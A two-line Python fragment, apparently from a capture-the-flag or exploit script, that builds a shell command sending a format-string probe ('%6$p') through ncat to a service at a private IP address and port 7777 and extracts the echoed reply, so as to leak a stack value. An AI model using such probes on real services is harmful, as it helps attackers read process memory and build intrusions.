cmd = rb"(echo -en 'a\nXXYXY%6$p\n'; sleep 2;) | ncat 10.21.235.85 7777 | grep -Po '(?<=You entered: ).*$'"

opts = b'\x00'